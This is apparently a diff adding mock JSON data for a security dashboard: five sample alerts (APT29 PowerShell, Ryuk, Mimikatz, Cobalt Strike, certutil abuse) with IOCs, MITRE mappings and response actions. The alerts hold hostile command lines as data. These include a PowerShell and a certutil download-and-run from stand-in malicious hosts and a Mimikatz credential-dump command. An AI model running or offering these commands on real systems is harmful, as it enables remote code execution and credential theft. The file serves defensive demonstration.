@@ -1,0 +1,419 @@
+{
+  "threats": [
+    {
+      "id": "th_001",
+      "title": "APT29 PowerShell Empire Framework",
+      "description": "Advanced persistent threat detected using PowerShell Empire framework for lateral movement and data exfiltration",
+      "severity": "critical",
+      "status": "open",
+      "threat_type": "Advanced Persistent Threat",
+      "threat_score": 95,
+      "confidence_score": 0.92,
+      "first_seen": "2025-01-08T08:30:00Z",
+      "last_seen": "2025-01-08T08:45:00Z",
+      "agent_id": "ag_wks_001",
+      "organization_id": "org_demo",
+      "source_ip": "192.168.1.105",
+      "destination_ip": "185.234.72.19",
+      "process_name": "powershell.exe",
+      "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "user_account": "DESKTOP-ABC123\\jdoe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"iex (iwr 'http://malicious-domain.com/payload.ps1').Content\"",
+      "mitre_techniques": [
+        {
+          "id": "T1059.001",
+          "name": "Command and Scripting Interpreter: PowerShell",
+          "tactic": "Execution"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer",
+          "tactic": "Command and Control"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information",
+          "tactic": "Defense Evasion"
+        }
+      ],
+      "kill_chain_phase": "Actions on Objectives",
+      "indicators": {
+        "iocs": [
+          "malicious-domain.com",
+          "185.234.72.19",
+          "payload.ps1"
+        ],
+        "file_hashes": [
+          "a1b2c3d4e5f6..."
+        ],
+        "network_signatures": [
+          "HTTP GET /payload.ps1"
+        ]
+      },
+      "forensics": {
+        "memory_artifacts": true,
+        "registry_changes": true,
+        "network_logs": true,
+        "file_system_changes": false
+      },
+      "timeline": [
+        {
+          "timestamp": "2025-01-08T08:30:00Z",
+          "event": "Initial PowerShell execution detected",
+          "severity": "high"
+        },
+        {
+          "timestamp": "2025-01-08T08:32:00Z",
+          "event": "Outbound connection to suspicious domain",
+          "severity": "critical"
+        },
+        {
+          "timestamp": "2025-01-08T08:35:00Z",
+          "event": "Payload download initiated",
+          "severity": "critical"
+        }
+      ],
+      "affected_assets": [
+        "DESKTOP-ABC123",
+        "Domain Controller"
+      ],
+      "response_actions": [
+        "isolate_endpoint",
+        "collect_memory_dump",
+        "block_domain"
+      ]
+    },
+    {
+      "id": "th_002",
+      "title": "Ryuk Ransomware Encryption Activity",
+      "description": "Rapid file modification pattern detected consistent with Ryuk ransomware encryption behavior targeting critical business files",
+      "severity": "critical",
+      "status": "investigating",
+      "threat_type": "Ransomware",
+      "threat_score": 98,
+      "confidence_score": 0.96,
+      "first_seen": "2025-01-08T07:15:00Z",
+      "last_seen": "2025-01-08T07:45:00Z",
+      "agent_id": "ag_srv_003",
+      "organization_id": "org_demo",
+      "source_ip": "192.168.1.50",
+      "destination_ip": null,
+      "process_name": "RyukReadMe.exe",
+      "file_path": "C:\\Temp\\RyukReadMe.exe",
+      "user_account": "NT AUTHORITY\\SYSTEM",
+      "command_line": "RyukReadMe.exe --encrypt --target C:\\Users --extension .ryuk",
+      "mitre_techniques": [
+        {
+          "id": "T1486",
+          "name": "Data Encrypted for Impact",
+          "tactic": "Impact"
+        },
+        {
+          "id": "T1027",
+          "name": "Obfuscated Files or Information",
+          "tactic": "Defense Evasion"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery",
+          "tactic": "Discovery"
+        }
+      ],
+      "kill_chain_phase": "Actions on Objectives",
+      "indicators": {
+        "iocs": [
+          "RyukReadMe.exe",
+          ".ryuk extension",
+          "RYUK-README.txt"
+        ],
+        "file_hashes": [
+          "e4b2a3d5c6f7..."
+        ],
+        "behavioral_patterns": [
+          "Rapid file encryption",
+          "Volume shadow copy deletion"
+        ]
+      },
+      "forensics": {
+        "memory_artifacts": true,
+        "registry_changes": true,
+        "network_logs": false,
+        "file_system_changes": true
+      },
+      "timeline": [
+        {
+          "timestamp": "2025-01-08T07:15:00Z",
+          "event": "Initial file encryption activity detected",
+          "severity": "critical"
+        },
+        {
+          "timestamp": "2025-01-08T07:20:00Z",
+          "event": "Volume shadow copies deleted",
+          "severity": "critical"
+        },
+        {
+          "timestamp": "2025-01-08T07:25:00Z",
+          "event": "Ransom note created in multiple directories",
+          "severity": "critical"
+        }
+      ],
+      "affected_assets": [
+        "SRV-FILESERVER01",
+        "Network shares"
+      ],
+      "response_actions": [
+        "isolate_system",
+        "preserve_evidence",
+        "initiate_backup_restore"
+      ]
+    },
+    {
+      "id": "th_003",
+      "title": "Mimikatz Credential Harvesting",
+      "description": "LSASS memory access detected using Mimikatz tool for credential dumping and potential privilege escalation",
+      "severity": "high",
+      "status": "open",
+      "threat_type": "Credential Access",
+      "threat_score": 85,
+      "confidence_score": 0.89,
+      "first_seen": "2025-01-08T06:22:00Z",
+      "last_seen": "2025-01-08T06:22:00Z",
+      "agent_id": "ag_wks_002",
+      "organization_id": "org_demo",
+      "source_ip": "192.168.1.78",
+      "destination_ip": null,
+      "process_name": "mimikatz.exe",
+      "file_path": "C:\\Users\\admin\\Downloads\\mimikatz.exe",
+      "user_account": "DOMAIN\\admin",
+      "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+      "mitre_techniques": [
+        {
+          "id": "T1003.001",
+          "name": "OS Credential Dumping: LSASS Memory",
+          "tactic": "Credential Access"
+        },
+        {
+          "id": "T1055",
+          "name": "Process Injection",
+          "tactic": "Defense Evasion"
+        }
+      ],
+      "kill_chain_phase": "Privilege Escalation",
+      "indicators": {
+        "iocs": [
+          "mimikatz.exe",
+          "privilege::debug",
+          "sekurlsa::logonpasswords"
+        ],
+        "file_hashes": [
+          "c3d4e5f6a7b8..."
+        ],
+        "behavioral_patterns": [
+          "LSASS memory access",
+          "Credential extraction"
+        ]
+      },
+      "forensics": {
+        "memory_artifacts": true,
+        "registry_changes": false,
+        "network_logs": false,
+        "file_system_changes": true
+      },
+      "timeline": [
+        {
+          "timestamp": "2025-01-08T06:22:00Z",
+          "event": "Mimikatz execution detected",
+          "severity": "high"
+        },
+        {
+          "timestamp": "2025-01-08T06:22:30Z",
+          "event": "LSASS memory access attempt",
+          "severity": "high"
+        }
+      ],
+      "affected_assets": [
+        "LAPTOP-DEF456",
+        "Domain credentials"
+      ],
+      "response_actions": [
+        "force_password_reset",
+        "enable_mfa",
+        "revoke_sessions"
+      ]
+    },
+    {
+      "id": "th_004",
+      "title": "Cobalt Strike Beacon Activity",
+      "description": "Command and control traffic consistent with Cobalt Strike beacon communication detected",
+      "severity": "high",
+      "status": "open",
+      "threat_type": "Command and Control",
+      "threat_score": 82,
+      "confidence_score": 0.87,
+      "first_seen": "2025-01-08T05:45:00Z",
+      "last_seen": "2025-01-08T09:30:00Z",
+      "agent_id": "ag_wks_001",
+      "organization_id": "org_demo",
+      "source_ip": "192.168.1.105",
+      "destination_ip": "23.95.67.142",
+      "process_name": "rundll32.exe",
+      "file_path": "C:\\Windows\\System32\\rundll32.exe",
+      "user_account": "DESKTOP-ABC123\\jdoe",
+      "command_line": "rundll32.exe C:\\Users\\Public\\beacon.dll,DllEntryPoint",
+      "mitre_techniques": [
+        {
+          "id": "T1071.001",
+          "name": "Application Layer Protocol: Web Protocols",
+          "tactic": "Command and Control"
+        },
+        {
+          "id": "T1573",
+          "name": "Encrypted Channel",
+          "tactic": "Command and Control"
+        },
+        {
+          "id": "T1218.011",
+          "name": "System Binary Proxy Execution: Rundll32",
+          "tactic": "Defense Evasion"
+        }
+      ],
+      "kill_chain_phase": "Command and Control",
+      "indicators": {
+        "iocs": [
+          "23.95.67.142",
+          "beacon.dll",
+          "periodic HTTP requests"
+        ],
+        "file_hashes": [
+          "d5e6f7a8b9c0..."
+        ],
+        "network_signatures": [
+          "Cobalt Strike beacon pattern",
+          "Encrypted C2 traffic"
+        ]
+      },
+      "forensics": {
+        "memory_artifacts": true,
+        "registry_changes": false,
+        "network_logs": true,
+        "file_system_changes": true
+      },
+      "timeline": [
+        {
+          "timestamp": "2025-01-08T05:45:00Z",
+          "event": "Initial beacon callback detected",
+          "severity": "medium"
+        },
+        {
+          "timestamp": "2025-01-08T06:00:00Z",
+          "event": "Periodic C2 communication established",
+          "severity": "high"
+        },
+        {
+          "timestamp": "2025-01-08T09:30:00Z",
+          "event": "Data exfiltration attempt detected",
+          "severity": "critical"
+        }
+      ],
+      "affected_assets": [
+        "DESKTOP-ABC123",
+        "Network perimeter"
+      ],
+      "response_actions": [
+        "block_c2_domain",
+        "quarantine_endpoint",
+        "analyze_beacon"
+      ]
+    },
+    {
+      "id": "th_005",
+      "title": "Living off the Land Binary Abuse",
+      "description": "Suspicious use of legitimate Windows binary (certutil.exe) for malicious file download and execution",
+      "severity": "medium",
+      "status": "resolved",
+      "threat_type": "Defense Evasion",
+      "threat_score": 68,
+      "confidence_score": 0.78,
+      "first_seen": "2025-01-07T14:20:00Z",
+      "last_seen": "2025-01-07T14:20:00Z",
+      "agent_id": "ag_wks_003",
+      "organization_id": "org_demo",
+      "source_ip": "192.168.1.89",
+      "destination_ip": "104.27.162.12",
+      "process_name": "certutil.exe",
+      "file_path": "C:\\Windows\\System32\\certutil.exe",
+      "user_account": "DESKTOP-XYZ789\\user1",
+      "command_line": "certutil.exe -urlcache -split -f http://malicious-site.com/payload.exe C:\\temp\\payload.exe",
+      "mitre_techniques": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer",
+          "tactic": "Command and Control"
+        },
+        {
+          "id": "T1218",
+          "name": "System Binary Proxy Execution",
+          "tactic": "Defense Evasion"
+        }
+      ],
+      "kill_chain_phase": "Delivery",
+      "indicators": {
+        "iocs": [
+          "malicious-site.com",
+          "104.27.162.12",
+          "payload.exe"
+        ],
+        "file_hashes": [
+          "f6a7b8c9d0e1..."
+        ],
+        "behavioral_patterns": [
+          "Certutil file download",
+          "Suspicious URL cache usage"
+        ]
+      },
+      "forensics": {
+        "memory_artifacts": false,
+        "registry_changes": true,
+        "network_logs": true,
+        "file_system_changes": true
+      },
+      "timeline": [
+        {
+          "timestamp": "2025-01-07T14:20:00Z",
+          "event": "Certutil file download initiated",
+          "severity": "medium"
+        },
+        {
+          "timestamp": "2025-01-07T14:21:00Z",
+          "event": "Payload file created on disk",
+          "severity": "medium"
+        }
+      ],
+      "affected_assets": [
+        "DESKTOP-XYZ789"
+      ],
+      "response_actions": [
+        "quarantine_file",
+        "block_domain",
+        "scan_system"
+      ]
+    }
+  ],
+  "metrics": {
+    "total_threats": 5,
+    "open_threats": 3,
+    "investigating_threats": 1,
+    "resolved_threats": 1,
+    "critical_threats": 2,
+    "high_threats": 2,
+    "medium_threats": 1,
+    "low_threats": 0,
+    "avg_confidence_score": 0.88,
+    "avg_threat_score": 84.6,
+    "mitre_coverage": {
+      "tactics": 8,
+      "techniques": 12,
+      "procedures": 15
+    }
+  }
+}
